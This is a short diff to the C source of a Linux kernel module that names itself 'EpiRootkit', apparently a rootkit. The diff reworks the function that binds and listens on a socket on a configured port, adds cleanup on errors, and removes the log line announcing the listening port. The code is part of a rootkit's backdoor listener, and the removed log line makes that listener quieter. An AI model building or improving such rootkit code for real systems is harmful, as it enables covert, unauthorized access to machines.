@@ -248,21 +248,20 @@ static int listen_for_connections(void) {
     addr.sin_port = htons(config.port);
     addr.sin_addr.s_addr = INADDR_ANY;
 
-    ret = g_connection_socket->ops->bind(g_connection_socket,
-                                        (struct sockaddr *)&addr,
-                                        sizeof(addr));
+    ret = kernel_bind(g_connection_socket, (struct sockaddr *)&addr, sizeof(addr));
     if (ret < 0) {
         printk(KERN_ERR "EpiRootkit: Failed to bind socket\n");
+        sock_release(g_connection_socket);
         return ret;
     }
 
-    ret = g_connection_socket->ops->listen(g_connection_socket, 1);
+    ret = kernel_listen(g_connection_socket, 1);
     if (ret < 0) {
-        printk(KERN_ERR "EpiRootkit: Failed to listen on socket\n");
+        printk(KERN_ERR "EpiRootkit: Failed to start listening\n");
+        sock_release(g_connection_socket);
         return ret;
     }
 
-    printk(KERN_INFO "EpiRootkit: Listening on port %d\n", config.port);
     return 0;
 }
 
